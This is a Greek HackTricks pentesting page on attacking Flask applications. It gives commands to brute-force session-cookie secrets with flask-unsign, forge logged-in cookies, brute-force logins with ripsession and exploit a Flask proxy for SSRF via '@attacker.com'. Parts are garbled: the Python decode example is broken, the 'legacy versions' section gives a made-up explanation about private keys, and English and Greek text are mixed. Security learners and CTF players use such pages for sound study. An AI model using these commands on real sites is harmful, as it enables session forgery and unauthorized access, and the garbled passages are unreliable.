# Flask

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**Πιθανώς, εάν παίζετε ένα CTF, μια εφαρμογή Flask θα σχετίζεται με** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**.**

## Cookies

Το προεπιλεγμένο όνομα της συνεδρίας των cookies είναι **`session`**.

### Αποκωδικοποιητής

Online αποκωδικοποιητής Flask cookies: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Χειροκίνητος

Πάρτε το πρώτο μέρος του cookie μέχρι το πρώτο σημείο και αποκωδικοποιήστε το με Base64>
```bash
echo "ImhlbGxvIg" | base64 -d
```
Το cookie υπογράφεται επίσης χρησιμοποιώντας έναν κωδικό πρόσβασης

### **Flask-Unsign**

Εργαλείο γραμμής εντολών για την ανάκτηση, αποκωδικοποίηση, επίθεση με brute-force και δημιουργία session cookies ενός Flask εφαρμογής μαντεύοντας τα μυστικά κλειδιά.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Αποκωδικοποίηση Cookie**

Η αποκωδικοποίηση του cookie είναι ένα σημαντικό βήμα κατά την εξέταση της ασφάλειας μιας εφαρμογής Flask. Τα cookies περιέχουν πληροφορίες που αποστέλλονται από τον διακομιστή στον πελάτη και αποθηκεύονται στον φυλλομετρητή του πελάτη. Οι πληροφορίες αυτές μπορεί να περιλαμβάνουν συνήθως δεδομένα σχετικά με την ταυτότητα του χρήστη, την κατάσταση σύνδεσης και άλλες προσαρμοσμένες πληροφορίες.

Για να αποκωδικοποιήσουμε ένα cookie, μπορούμε να χρησιμοποιήσουμε τη βιβλιοθήκη `itsdangerous` της Flask. Αυτή η βιβλιοθήκη παρέχει μια κλάση με το όνομα `URLSafeTimedSerializer`, η οποία μπορεί να χρησιμοποιηθεί για την αποκωδικοποίηση του cookie.

Παρακάτω παρουσιάζεται ένα παράδειγμα κώδικα σε Python για την αποκωδικοποίηση ενός cookie:

```python
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = 'your_secret_key'

@app.route('/')
def decode_cookie():
    cookie_value = request.cookies.get('cookie_name')
    serializer = URLSafeTimedSerializer(app.secret_key)
    decoded_cookie = serializer.loads(cookie_value)
    return decoded_cookie
```

Στον παραπάνω κώδικα, πρέπει να αντικαταστήσετε την `'your_secret_key'` με το μυστικό κλειδί που χρησιμοποιείται για την υπογραφή των cookies. Επίσης, πρέπει να αντικαταστήσετε το `'cookie_name'` με το όνομα του cookie που θέλετε να αποκωδικοποιήσετε.

Με τη χρήση της παραπάνω κώδικα, μπορείτε να αποκωδικοποιήσετε ένα cookie και να επιστρέψετε τις αποκωδικοποιημένες πληροφορίες.
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **Βίαιη Δύναμη (Brute Force)**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **Υπογραφή**

Signing is a process used to verify the authenticity and integrity of data. It involves using a cryptographic algorithm to generate a digital signature, which is a unique identifier that can be used to verify the source of the data and ensure that it has not been tampered with.

Η υπογραφή είναι ένας διαδικασία που χρησιμοποιείται για να επαληθευτεί η αυθεντικότητα και η ακεραιότητα των δεδομένων. Περιλαμβάνει τη χρήση ενός κρυπτογραφικού αλγορίθμου για τη δημιουργία μιας ψηφιακής υπογραφής, η οποία είναι ένας μοναδικός αναγνωριστικός κωδικός που μπορεί να χρησιμοποιηθεί για να επαληθευτεί η πηγή των δεδομένων και να διασφαλιστεί ότι δεν έχει τροποποιηθεί.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### Υπογραφή χρησιμοποιώντας παλαιότερες εκδόσεις

To sign using legacy versions, you can follow these steps:

1. Generate a private key using the desired legacy version.
2. Use the private key to sign the data or message.
3. Verify the signature using the corresponding public key.

Keep in mind that using legacy versions may have security vulnerabilities, so it is recommended to use the latest versions whenever possible.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

Εργαλείο γραμμής εντολών για brute-force επιθέσεις σε ιστοσελίδες χρησιμοποιώντας cookies που έχουν δημιουργηθεί με το flask-unsign.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi στο session cookie του Flask με το SQLmap

[**Αυτό το παράδειγμα**](../../pentesting-web/sql-injection/sqlmap/#eval) χρησιμοποιεί την επιλογή `eval` του sqlmap για να **αυτοματοποιήσει την υπογραφή των sqlmap payloads** για το Flask χρησιμοποιώντας ένα γνωστό μυστικό.

## Flask Proxy για SSRF

[**Σε αυτήν την ανάλυση**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) εξηγείται πώς το Flask επιτρέπει ένα αίτημα που ξεκινά με τον χαρακτήρα "@":
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
Σε ακόλουθο σενάριο:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
Μπορεί να επιτρέψει την εισαγωγή κάτι σαν "@attacker.com" για να προκαλέσει ένα **SSRF**.

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
